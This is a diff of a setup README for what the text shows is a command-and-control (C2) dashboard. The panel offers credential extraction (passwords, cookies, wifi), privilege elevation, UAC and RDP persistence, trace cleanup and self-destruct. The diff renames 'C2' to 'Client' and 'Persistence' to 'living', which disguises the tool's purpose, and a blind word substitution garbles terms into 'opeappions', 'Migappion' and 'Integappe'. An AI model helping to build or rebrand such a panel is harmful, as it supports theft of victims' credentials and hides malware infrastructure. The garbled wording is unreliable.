@@ -1,4 +1,4 @@
-# Complete C2 Dashboard - Setup & Getting Started
+# Complete Client  Dashboard - Setup & Getting Started
 
 ## Installation
 
@@ -27,7 +27,7 @@ Key dependencies installed:
 mkdir -p data
 ```
 
-The database `data/c2-dashboard.db` is created automatically on first app start.
+The database `data/Client -dashboard.db` is created automatically on first app start.
 
 ### 3. Run Development Server
 ```bash
@@ -99,7 +99,7 @@ curl -X POST http://localhost:3000/api/test/mock-client \
 │   │   ├── clients/           # Client management
 │   │   ├── commands/          # Command execution
 │   │   ├── system/            # System metrics
-│   │   ├── files/             # File operations
+│   │   ├── files/             # File opeappions
 │   │   ├── dashboard/         # Dashboard stats
 │   │   └── test/              # Mock client API
 │   ├── layout.tsx             # Root layout (dark theme)
@@ -119,11 +119,11 @@ curl -X POST http://localhost:3000/api/test/mock-client \
 │   ├── client-manager.ts      # Client logic
 │   ├── command-queue.ts       # Command queue
 │   ├── system-monitor.ts      # Metrics tracking
-│   ├── file-operations.ts     # File management
+│   ├── file-opeappions.ts     # File management
 │   ├── session-manager.ts     # Sessions
 │   └── websocket-handler.ts   # Real-time updates
 ├── data/
-│   └── c2-dashboard.db        # SQLite database (auto-created)
+│   └── Client -dashboard.db        # SQLite database (auto-created)
 ├── scripts/
 │   └── init-db.sql            # Schema definitions
 └── documentation files (*.md)
@@ -137,7 +137,7 @@ curl -X POST http://localhost:3000/api/test/mock-client \
    - Clients: View connected clients
    - Commands: Execute and track commands
    - Monitoring: View system metrics
-   - Files: Manage file operations
+   - Files: Manage file opeappions
 
 2. **Clients Panel**
    - Search and filter clients
@@ -156,7 +156,7 @@ curl -X POST http://localhost:3000/api/test/mock-client \
      - Files (download, upload, browse, encrypt)
      - Credentials (extract passwords, cookies, wifi)
      - System (info, processes, registry, scanner)
-     - Persistence (enable, elevate, RDP, UAC)
+     - living (enable, elevate, RDP, UAC)
      - Cleanup (traces, self-destruct, abort)
 
 4. **Monitoring Panel**
@@ -191,8 +191,8 @@ All APIs: `http://localhost:3000/api`
 - `GET /system/[id]/metrics` - Client metrics
 
 **Files**
-- `POST /files/operations` - Create file op
-- `GET /files/list` - List file operations
+- `POST /files/opeappions` - Create file op
+- `GET /files/list` - List file opeappions
 - `GET /files/[id]/status` - File status
 - `POST /files/[id]/status` - Update status
 
@@ -202,7 +202,7 @@ All APIs: `http://localhost:3000/api`
 
 **Testing**
 - `GET /test/mock-client` - Info
-- `POST /test/mock-client` - Run operations
+- `POST /test/mock-client` - Run opeappions
 
 ## React Hooks Usage
 
@@ -229,23 +229,23 @@ function MyComponent() {
 
 ### Check Database
 ```bash
-sqlite3 data/c2-dashboard.db "SELECT * FROM clients;" 
+sqlite3 data/Client -dashboard.db "SELECT * FROM clients;" 
 ```
 
 ### Clear All Data
 ```bash
-rm data/c2-dashboard.db
+rm data/Client -dashboard.db
 # Will be recreated on next app start
 ```
 
 ### View Command History
 ```bash
-sqlite3 data/c2-dashboard.db "SELECT * FROM commands;"
+sqlite3 data/Client -dashboard.db "SELECT * FROM commands;"
 ```
 
 ### Export Metrics
 ```bash
-sqlite3 data/c2-dashboard.db ".mode csv" ".output metrics.csv" "SELECT * FROM system_info;" ".quit"
+sqlite3 data/Client -dashboard.db ".mode csv" ".output metrics.csv" "SELECT * FROM system_info;" ".quit"
 ```
 
 ## Troubleshooting
@@ -264,7 +264,7 @@ taskkill /PID <PID> /F
 ### Database Errors
 ```bash
 # Reset database
-rm data/c2-dashboard.db
+rm data/Client -dashboard.db
 pnpm dev  # Will recreate
 ```
 
@@ -288,7 +288,7 @@ NEXT_PUBLIC_API_URL=https://your-domain.com
 NODE_ENV=production
 ```
 
-### Database Migration
+### Database Migappion
 For production, consider:
 1. PostgreSQL (better for multi-user)
 2. Regular backups
@@ -324,7 +324,7 @@ vercel deploy
 
 1. Read `BACKEND_GUIDE.md` for API details
 2. Read `FEATURES.md` for command descriptions
-3. Integrate with actual clients (Python/C# agent)
+3. Integappe with actual clients (Python/C# agent)
 4. Set up WebSocket for real-time updates
 5. Add authentication layer
 
